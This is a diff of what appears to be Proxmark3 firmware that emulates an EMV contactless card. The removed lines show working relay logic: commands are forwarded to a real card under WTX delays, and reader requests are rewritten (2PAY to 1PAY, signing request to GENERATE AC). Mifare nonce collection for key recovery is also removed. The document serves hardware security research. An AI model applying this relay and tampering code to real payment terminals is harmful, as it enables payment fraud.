-        if (prepare_allocated_tag_modulation(&responses_init[i], &free_buffer_pointer, &free_buffer_size) == false) {
-            Dbprintf("Not enough modulation buffer size, exit after %d elements", i);
-            return false;
-        }
-    }
-
-    *responses = responses_init;
-
-    // indices into responses array:
-#define ATQA     0
-#define SAK      1
-#define SAKuid   2
-#define UIDBCC1  3
-#define UIDBCC2  8
-#define UIDBCC3  13
-
-    return true;
+    // Send a request for more time, and cache the command we want to process
+    EmSendCmd(extend_resp, 4);
 }
 
 /**
-*xxxxxxxxxxxxxxxxxx.
+* EMVsim - simulate an EMV contactless card transaction by
 *
-*@param flags :
-*@param exitAfterNReads, exit simulation after n blocks have been read, 0 is infinite ...
+*@param flags: See pm3_cmd.h for the full definitions
+*@param exitAfterNReads, exit simulation after n transactions (default 1)
+*@param uid, UID - must be length 7
+*@param atqa, override for ATQA, flags indicate if this is used
+*@param sak, override for SAK, flags indicate if this is used
 * (unless reader attack mode enabled then it runs util it gets enough nonces to recover all keys attmpted)
 */
-void EMVsim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint16_t atqa, uint8_t sak) {
+void EMVsim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *uid, uint16_t atqa, uint8_t sak) {
 
     tag_response_info_t *responses;
     uint8_t cardSTATE = MFEMUL_NOFIELD;
-    uint8_t uid_len = 0; // 4, 7, 10
-    uint32_t cuid = 0, authTimer = 0;
-    uint32_t nr, ar;
+    uint8_t uid_len = 0; // 7
+    uint32_t cuid = 0;
 
-    uint8_t cardWRBL = 0;
-    uint8_t cardAUTHSC = 0;
-    uint8_t cardAUTHKEY = AUTHKEYNONE;  // no authentication
-    uint32_t cardRr = 0;
-    uint32_t ans = 0;
-    uint32_t cardINTREG = 0;
-    uint8_t cardINTBLOCK = 0;
-
-    struct Crypto1State mpcs = {0, 0};
-    struct Crypto1State *pcs;
-    pcs = &mpcs;
-
-    //uint32_t numReads = 0; //Counts numer of times reader reads a block
     uint8_t receivedCmd[MAX_FRAME_SIZE] = {0x00};
     uint8_t receivedCmd_copy[MAX_FRAME_SIZE] = {0x00};
-    uint8_t receivedCmd_dec[MAX_FRAME_SIZE] = {0x00};
-    //uint8_t convenient_buffer[64] = {0x00};
     uint8_t receivedCmd_par[MAX_MIFARE_PARITY_SIZE] = {0x00};
-    uint8_t responseToReader[MAX_FRAME_SIZE] = {0x00};
-    uint16_t responseToReader_len;
     uint16_t receivedCmd_len;
     uint16_t receivedCmd_len_copy = 0;
 
@@ -383,33 +319,27 @@ void EMVsim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint16_t a
     uint8_t *rats = NULL;
     uint8_t rats_len = 0;
 
-    // if fct is called with NULL we need to assign some memory since this pointer is passaed around
-    uint8_t datain_tmp[10] = {0};
-    if (datain == NULL) {
-        datain = datain_tmp;
+    // if fct is called with NULL we need to assign some memory since this pointer is passed around
+    uint8_t uid_tmp[10] = {0};
+    if (uid == NULL) {
+        uid = uid_tmp;
     }
-
-    //Here, we collect UID,sector,keytype,NT,AR,NR,NT2,AR2,NR2
-    // This will be used in the reader-only attack.
-
-    //allow collecting up to 7 sets of nonces to allow recovery of up to 7 keys
-#define ATTACK_KEY_COUNT 7 // keep same as define in cmdhfmf.c -> readerAttack() (Cannot be more than 7)
-    nonces_t ar_nr_resp[ATTACK_KEY_COUNT * 2]; // *2 for 2 separate attack types (nml, moebius) 36 * 7 * 2 bytes = 504 bytes
-    memset(ar_nr_resp, 0x00, sizeof(ar_nr_resp));
-
-    uint8_t ar_nr_collected[ATTACK_KEY_COUNT * 2]; // *2 for 2nd attack type (moebius)
-    memset(ar_nr_collected, 0x00, sizeof(ar_nr_collected));
-    bool gettingMoebius = false;
 
     const tUart14a *uart = GetUart14a();
 
     // free eventually allocated BigBuf memory but keep Emulator Memory
     BigBuf_free_keep_EM();
 
-    if (MifareSimInit(flags, datain, atqa, sak, &responses, &cuid, &uid_len, &rats, &rats_len) == false) {
+    // Print all arguments going into mifare sim init
+    Dbprintf("EMVsim: flags: %04x, uid: %p, atqa: %04x, sak: %02x", flags, uid, atqa, sak);
+
+    if (MifareSimInit(flags, uid, atqa, sak, &responses, &cuid, &uid_len, &rats, &rats_len) == false) {
         BigBuf_free_keep_EM();
         return;
     }
+
+    // Print all the outputs after the sim init
+    Dbprintf("EMVsim: cuid: %08x, uid_len: %d, rats: %p, rats_len: %d", cuid, uid_len, rats, rats_len);
 
     // We need to listen to the high-frequency, peak-detected path.
     iso14443a_setup(FPGA_HF_ISO14443A_TAGSIM_LISTEN);
@@ -419,8 +349,6 @@ void EMVsim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint16_t a
     set_tracing(true);
     LED_D_ON();
     ResetSspClk();
-
-    uint8_t *p_em = BigBuf_get_EM_addr();
 
     int counter = 0;
     bool finished = false;
@@ -445,9 +373,6 @@ void EMVsim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint16_t a
         int res = EmGetCmd(receivedCmd, sizeof(receivedCmd), &receivedCmd_len, receivedCmd_par);
 
         if (res == 2) { //Field is off!
-            if ((flags & FLAG_CVE21_0430_OLD) == FLAG_CVE21_0430_OLD) {
-                p_em[1] = 0x21;
-            }
             LEDsoff();
             if (cardSTATE != MFEMUL_NOFIELD) {
                 Dbprintf("cardSTATE = MFEMUL_NOFIELD");
@@ -600,17 +525,17 @@ void EMVsim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint16_t a
                     break;
                 }
 
-                memcpy(receivedCmd_dec, receivedCmd, receivedCmd_len);
-
                 // all commands must have a valid CRC
-                if (!CheckCrc14A(receivedCmd_dec, receivedCmd_len)) {
-                    if (g_dbglevel >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK] All commands must have a valid CRC %02X (%d)", receivedCmd_dec, receivedCmd_len);
+                if (!CheckCrc14A(receivedCmd, receivedCmd_len)) {
+                    if (g_dbglevel >= DBG_EXTENDED)
+                        Dbprintf("[MFEMUL_WORK] All commands must have a valid CRC %02X (%d)", receivedCmd,
+                                 receivedCmd_len);
                     break;
                 }
 
                 // rule 13 of 7.5.3. in ISO 14443-4. chaining shall be continued
                 // BUT... ACK --> NACK
-                if (receivedCmd_len == 1 && receivedCmd_dec[0] == CARD_ACK) {
+                if (receivedCmd_len == 1 && receivedCmd[0] == CARD_ACK) {
                     Dbprintf("[MFEMUL_WORK] ACK --> NACK !!");
                     EmSend4bit(CARD_NACK_NA);
                     FpgaDisableTracing();
@@ -618,7 +543,7 @@ void EMVsim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint16_t a
                 }
 
                 // rule 12 of 7.5.3. in ISO 14443-4. R(NAK) --> R(ACK)
-                if (receivedCmd_len == 1 && receivedCmd_dec[0] == CARD_NACK_NA) {
+                if (receivedCmd_len == 1 && receivedCmd[0] == CARD_NACK_NA) {
                     Dbprintf("[MFEMUL_WORK] NACK --> NACK !!");
                     EmSend4bit(CARD_ACK);
                     FpgaDisableTracing();
@@ -626,7 +551,7 @@ void EMVsim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint16_t a
                 }
 
                 // case MFEMUL_WORK => CMD RATS
-                if (receivedCmd_len == 4 && receivedCmd_dec[0] == ISO14443A_CMD_RATS && receivedCmd_dec[1] == 0x80) {
+                if (receivedCmd_len == 4 && receivedCmd[0] == ISO14443A_CMD_RATS && receivedCmd[1] == 0x80) {
                     if (rats && rats_len) {
                         EmSendCmd(rats, rats_len);
                         FpgaDisableTracing();
@@ -641,9 +566,9 @@ void EMVsim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint16_t a
                 }
 
                 // case MFEMUL_WORK => ISO14443A_CMD_NXP_DESELECT
-                if (receivedCmd_len == 3 && receivedCmd_dec[0] == ISO14443A_CMD_NXP_DESELECT) {
+                if (receivedCmd_len == 3 && receivedCmd[0] == ISO14443A_CMD_NXP_DESELECT) {
                     if (rats && rats_len) {
-                        EmSendCmd(receivedCmd_dec, receivedCmd_len);
+                        EmSendCmd(receivedCmd, receivedCmd_len);
 
                         FpgaDisableTracing();
                         if (g_dbglevel >= DBG_EXTENDED)
@@ -658,111 +583,12 @@ void EMVsim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint16_t a
                     break;
                 }
 
-                // The WTX we want to send out...
-                //static uint8_t extend_resp[] = {0xf2, 0x01, 0x91, 0x40};
-                //static uint8_t extend_resp[] = {0xf2, 0x02, 0x0a, 0x72};
-                //static uint8_t extend_resp[] = {0xf2, 0x03, 0x83, 0x63};
-                //static uint8_t extend_resp[] = {0xf2, 0x04, 0x3c, 0x17};
-                //static uint8_t extend_resp[] = {0xf2, 0x05, 0x50, 0x6b};
-                //static uint8_t extend_resp[] = {0xf2, 0x06, 0x2e, 0x34};
-                //static uint8_t extend_resp[] = {0xf2, 0x07, 0xa7, 0x25};
-                //static uint8_t extend_resp[] = {0xf2, 0x08, 0x50, 0xdd}; // This works
-                //static uint8_t extend_resp[] = {0xf2, 0x09, 0xd9, 0xcc};
-                //static uint8_t extend_resp[] = {0xf2, 0x0a, 0x42, 0xfe};
-                //static uint8_t extend_resp[] = {0xf2, 0x0b, 0xcb, 0xef};
-                //static uint8_t extend_resp[] = {0xf2, 0x0c, 0x74, 0x9b};
-                //static uint8_t extend_resp[] = {0xf2, 0x0d, 0xfd, 0x8a};
-                static uint8_t extend_resp[] = {0xf2, 0x0e, 0x66, 0xb8};
 
-                // special print me
-                Dbprintf("\nrecvd from reader:");
-                Dbhexdump(receivedCmd_len, receivedCmd, false);
-                Dbprintf("");
+                // From this point onwards is where the 'magic' happens
+                ExecuteEMVSim(receivedCmd, receivedCmd_len, receivedCmd_copy, receivedCmd_len_copy);
 
-                // lets handle some obvious stuff here!
-                if (receivedCmd[6] == 'O' && receivedCmd[7] == 'S' && receivedCmd[8] == 'E') {
-                    Dbprintf("We saw OSE... ignore it!");
-                    //Full: 02  6a  82  93  2f
-                    EmSendCmd(filenotfound, 5);
-                    continue;
-                }
-
-                // rather than asing for more time, lets just send the response with the PDOL there too
-                //  there are two of this for some reason?? Ach, this one is not at the card read level, that is why.
-                if (memcmp(&fci_query[0], receivedCmd, sizeof(fci_query)) == 0 && false) {
-                    Dbprintf("***** returning fast FCI response...!");
-                    //uint8_t modified_response[] = { 0x03, 0x77, 0x0e, 0x82, 0x02, 0x39, 0x80, 0x94, 0x08, 0x18, 0x01, 0x02, 0x01, 0x20, 0x01, 0x04, 0x00, 0x90, 0x00, 0x03, 0xec };
-                    //uint8_t modified_response[] = { 0x03, 0x77, 0x0e, 0x82, 0x02, 0x39, 0x80, 0x94, 0x08, 0x18, 0x01, 0x02, 0x01, 0x20, 0x01, 0x04, 0x00, 0x90, 0x00, 0x03, 0xec };
-                    EmSendCmd(&fci_template[0], sizeof(fci_template));
-
-                    continue;
-                }
-
-                // We want to modify corrupted request
-                if ((receivedCmd_len > 5 && receivedCmd[0] != 0x03 && receivedCmd[0] != 0x02 && receivedCmd[1] == 0 && receivedCmd[4] == 0) || (receivedCmd[2] == 0xa8)) {
-                    //if (receivedCmd[2] == 0xa8) {
-                    Dbprintf("We saw signing request... modifying it into a generate ac transaction !!!!");
-                    receivedCmd[0] = 0x03;
-                    receivedCmd[1] = 0x80;
-                    receivedCmd[2] = 0xae;
-                    receivedCmd[3] = 0x80;
-                    receivedCmd[4] = 0x00;
-                    receivedCmd[5] = 0x1d;
-
-                    for (int i = 0; i < 29; i++) {
-                        receivedCmd[6 + i] = receivedCmd[12 + i];
-                    }
-
-                    // clear final byte just in case
-                    receivedCmd[35] = 0;
-
-                    receivedCmd_len = 35 + 3; // Core command is 35, then there is control code and hte crc
-
-                    Dbprintf("\nthe command has now become:");
-                    Dbhexdump(receivedCmd_len, receivedCmd, false);
-                }
-
-                // Seems unlikely
-                if (receivedCmd_len >= 9 && receivedCmd[6] == '1' && receivedCmd[7] == 'P' && receivedCmd[8] == 'A') {
-                    Dbprintf("We saw 1PA... !!!!");
-                }
-
-                // Request more time for 2PAY and respond with a modified 1PAY request
-                if (receivedCmd_len >= 9 && receivedCmd[6] == '2' && receivedCmd[7] == 'P' && receivedCmd[8] == 'A') {
-                    Dbprintf("We saw 2PA... switching it to 1PAY !!!!");
-                    receivedCmd[6] = '1';
-                }
-
-                static uint8_t rnd_resp[] = {0xb2, 0x67, 0xc7};
-                if (memcmp(receivedCmd, rnd_resp, sizeof(rnd_resp)) == 0) {
-                    Dbprintf("We saw bad response... !");
-                    continue;
-                }
-
-                // We have received the response from a WTX command! Process the cached command at this point.
-                if (memcmp(receivedCmd, extend_resp, sizeof(extend_resp)) == 0) {
-                    // Special case: if we are about to do a generate AC, we also need to
-                    // make a request for pdol...
-                    if (receivedCmd_copy[1] == 0x80 && receivedCmd_copy[2] == 0xae) {
-                        Dbprintf("We are about to do a generate AC... we need to request PDOL first...");
-                        uint8_t pdol_request[] = { 0x80, 0xa8, 0x00, 0x00, 0x02, 0x83, 0x00 };
-
-                        CmdSmartRaw(0xff, &(pdol_request[0]), sizeof(pdol_request), (&responseToReader[0]), &responseToReader_len);
-                    }
-
-                    // This is minus 3 because we don't include the first byte (prepend), plus we don't want to send the
-                    // last two bytes (CRC) to the card
-                    CmdSmartRaw(receivedCmd_copy[0], &(receivedCmd_copy[1]), receivedCmd_len_copy - 3, (&responseToReader[0]), &responseToReader_len);
-                    EmSendCmd(responseToReader, responseToReader_len);
-
-                    Dbprintf("Sent delayed command to card...");
-                    continue;
-                }
-
-                // Send a request for more time, and cache the command we want to process
-                EmSendCmd(extend_resp, 4);
-
-                // copy the command and its length (minus 1???)
+                // We want to keep a copy of the command we just saw, because we will process it once we get the
+                // WTX response
                 Dbprintf("Caching command for later processing... its length is %d", receivedCmd_len);
                 memcpy(receivedCmd_copy, receivedCmd, receivedCmd_len);
                 receivedCmd_len_copy = receivedCmd_len;
@@ -784,4 +610,72 @@ void EMVsim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *datain, uint16_t a
     LEDsoff();
     set_tracing(false);
     BigBuf_free_keep_EM();
+}
+
+// annotate iso 7816
+void annotate(uint8_t *cmd, uint8_t cmdsize) {
+    if (cmdsize < 2) {
+        return;
+    }
+
+    // From https://mvallim.github.io/emv-qrcode/docs/EMV_v4.3_Book_3_Application_Specification_20120607062110791.pdf
+    // section 6.3.2
+    switch (cmd[1]) {
+        case ISO7816_APPLICATION_BLOCK: {
+            Dbprintf("APPLICATION BLOCK");
+            break;
+        }
+        case ISO7816_APPLICATION_UNBLOCK: {
+            Dbprintf("APPLICATION UNBLOCK");
+            break;
+        }
+        case ISO7816_CARD_BLOCK: {
+            Dbprintf("CARD BLOCK");
+            break;
+        }
+        case ISO7816_EXTERNAL_AUTHENTICATION: {
+            Dbprintf("EXTERNAL AUTHENTICATE");
+            break;
+        }
+        case ISO7816_GENERATE_APPLICATION_CRYPTOGRAM: {
+            Dbprintf("GENERATE APPLICATION CRYPTOGRAM");
+            break;
+        }
+        case ISO7816_GET_CHALLENGE: {
+            Dbprintf("GET CHALLENGE");
+            break;
+        }
+        case ISO7816_GET_DATA: {
+            Dbprintf("GET DATA");
+            break;
+        }
+        case ISO7816_GET_PROCESSING_OPTIONS: {
+            Dbprintf("GET PROCESSING OPTIONS");
+            break;
+        }
+        case ISO7816_INTERNAL_AUTHENTICATION: {
+            Dbprintf("INTERNAL AUTHENTICATION");
+            break;
+        }
+        case ISO7816_PIN_CHANGE: {
+            Dbprintf("PIN CHANGE");
+            break;
+        }
+        case ISO7816_READ_RECORDS: {
+            Dbprintf("READ RECORDS");
+            break;
+        }
+        case ISO7816_SELECT_FILE: {
+            Dbprintf("SELECT FILE");
+            break;
+        }
+        case ISO7816_VERIFY: {
+            Dbprintf("VERIFY");
+            break;
+        }
+        default: {
+            Dbprintf("NOT RECOGNISED");
+            break;
+        }
+    }
 }
